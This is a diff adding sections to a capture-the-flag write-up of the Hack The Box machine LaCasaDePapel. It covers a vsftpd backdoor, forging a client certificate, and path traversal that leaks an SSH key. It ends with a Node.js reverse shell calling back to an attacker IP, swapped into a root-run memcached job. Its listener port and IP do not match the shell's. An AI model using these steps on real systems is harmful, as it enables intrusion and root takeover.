@@ -5,6 +5,7 @@ Yes interestingly, I came to know of the Netflix series through this box so who 
 
 ![heist](heist.jpg)
 
+## Basic enumeration
 Back to the box, first things first, nmap scan with flags -sV -sC:
 
 ```
@@ -117,6 +118,7 @@ ftp>
 ```
 Nope, no luck this time.
 
+## vsftpd exploit
 Doing a search on exploits on this version of vsftpd, we find that there is a backdoor exploit on github by @In2econd that we can use to open a backdoor to port 6200 by calling a vsf_sysutil_extra() function with the ascii characters 0x3a and 0x29 in the username which correspond to a smiley face, and find the service listening on that port. https://github.com/In2econd/vsftpd-2.3.4-exploit.
 
 Running the exploit script with the valid parameters leads us to a discover a Psy shell command line interface running on port 6200.
@@ -233,14 +235,166 @@ $foo=scandir('/home/berlin')
 $foo=scandir('/home/berlin/.ssh')
 PHP Warning:  scandir(/home/berlin/.ssh): failed to open dir: Permission denied in phar://eval()'d code on line 1
 ```
+
+## Web Enumeration
 Moving on from the cli enumeration, we can check out the 2 webservices on 80 and 443!
 
 80 (http):
 
 ![http](http.png)
 
+The google authenticator seems to be a rabbit hole as the submit button redirects us to the same index page no matter the input.
+Might be wrong, but let's look at the https service to see what we can do.
+
 443 (https):
 
 ![https](https.png)
 
+Seems like the CA key that we found might come in handy! This looks like it's expecting us to provide a client certificate signed by the CA cert that the site provides and the CA key that we got from the server. Following this guide: https://medium.com/@sevcsik/authentication-using-https-client-certificates-3c9d270e8326, the steps are pretty simple to follow and we should be getting authentication in no time!
 
+After uploading the p12 format cert we created, a pop-up should show, prompting us to verify the cert we want to use for authentication. Following that, we are presented with the index page!
+
+![index]('index.png')
+
+## Path Traversal and Local File Inclusion (LFI)
+Clicking on the sesason1 link will take us to a page with .avi files that are basically just empty text files. However, we can notice that the url has ```PATH``` as a query which means it could be vulnerable to path traversal and local file inclusion attacks.
+
+![avi]('avi.png')
+
+Trying to view the /etc/passwd folder yields us an error from the ```fs.readdirSync``` method which tells us that only directory scanning is allowed.
+
+```
+<pre>Error: ENOTDIR: not a directory, scandir &#39;/home/berlin/downloads/../../../../etc/passwd/&#39;<br> &nbsp; &nbsp;at Object.fs.readdirSync
+```
+Was stuck at this point for quite a bit trying to bypass the path traversal and get remote code execution with blind injection methods. After looking through the forums, I realised we could get some clues from the path of the avi files that can allow for LFI.
+```https://10.10.10.131/file/U0VBU09OLTEvMDEuYXZp```
+The file path is base64 encoded and if we can get encode our path to the user.txt file from one level up, we'll get the hash! True enough it works! But lets see if we can get more files from the .ssh folder which may get us a shell on the server!
+
+![lfi]('lfi.png')
+
+We can see that there is a id_rsa file that we can use for ssh authentication. No need for passwords!
+
+![rsa]('rsa.png')
+
+With the private key, we can try authenticating as berlin, the user that we got our private key file from. 
+```
+root@kali:~/Downloads# chmod 600 id_rsa 
+root@kali:~/Downloads# ssh -i id_rsa berlin@10.10.10.131
+berlin@10.10.10.131's password: 
+
+```
+Seems like this isn't the key for this user. Lets try to see if professor works.
+
+```
+root@kali:~/Downloads# ssh -i id_rsa professor@10.10.10.131
+
+ _             ____                  ____         ____                  _ 
+| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
+| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | '_ \ / _ \ |
+| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
+|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
+                                                            |_|       
+
+lacasadepapel [~]$ 
+```
+And we're in!
+
+## Privilege Escalation
+
+First, let's see what files we have in the ```pwd``` and which of them are writeable/readeable
+```
+drwxr-sr-x    4 professo professo      4096 Jul 21 09:34 .
+drwxr-xr-x    7 root     root          4096 Feb 16 18:06 ..
+lrwxrwxrwx    1 root     professo         9 Nov  6  2018 .ash_history -> /dev/null
+drwx------    2 professo professo      4096 Jan 31 21:36 .ssh
+-rwxr-xr-x    1 professo professo     45651 Jul 21 09:34 LinEnum.sh
+-rw-r--r--    1 root     root            88 Jan 29 01:25 memcached.ini
+-rw-r-----    1 root     nobody         434 Jan 29 01:24 memcached.js
+drwxr-sr-x    9 root     professo      4096 Jan 29 01:31 node_modules
+-rwxr-xr-x    1 professo professo   4468984 Jul 21 09:35 pspy64
+```
+Next, we run some enumeration scripts and see what processes are running on the server:
+
+LinEnum.sh:
+```
+Linux version 4.14.78-0-virt (buildozer@build-edge-x86_64) (gcc version 8.2.0 (Alpine 8.2.0)) #1-Alpine SMP Tue Oct 23 11:43:38 UTC 2018
+....
+[-] Can we read/write sensitive files:
+-rw-r--r--    1 root     root          1548 Jan 31 21:49 /etc/passwd
+-rw-r--r--    1 root     root           794 Jan 27 01:46 /etc/group
+-rw-r--r--    1 root     root           259 Jul 27  2018 /etc/profile
+-rw-r-----    1 root     shadow        1037 Jan 27 01:46 /etc/shadow
+....
+memcached:x:102:102:memcached:/home/memcached:/sbin/nologin
+```
+We notice a memcached user which corresponds to the files we see in the user's directory. Could be helpful. Sensitive files are not writeable.
+
+pspy:
+```
+...
+2019/07/21 09:45:05 CMD: UID=65534 PID=9162   | /usr/bin/node /home/professor/memcached.js
+```
+The memcached file is being run not as ```root``` but as ```nobody```, as seen in the .ini file
+```
+[program:memcached]
+command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
+```
+If we can somehow replace the memcached.js file with a js reverse shell, we can get a root shell! 
+
+Since we have read write access in this folder, we can move the original memcached.js and .ini file to another folder and replace it with our own malicious memcached.js and .ini file.
+Referencing to https://github.com/cyberheartmi9/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md , we can craft a JS reverse shell script,
+```
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(8080, "10.17.26.64", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+```
+And change the .ini file command to execute memcached.js as root since the service is initialised with root privileges, the ini file will be run as root.
+```
+[program:memcached]
+command = sudo -u root /usr/bin/node /home/professor/memcached.js
+```
+
+Now we can wait a bit for the cronjob to execute and get ourselves a root shell!
+```
+root@kali:~/Downloads# nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.14] from (UNKNOWN) [10.10.10.131] 56896
+ls
+bin
+boot
+dev
+etc
+home
+lib
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+swap
+sys
+tmp
+usr
+var
+whoami
+root
+cd root
+ls
+root.txt
+cat root.txt
+586979c48efbef5909a23750cc07f511
+```
+Fun box overall, learnt a lot about process hijacking and manual cert generation and authentication for https sites. Hope you learned something from this too!
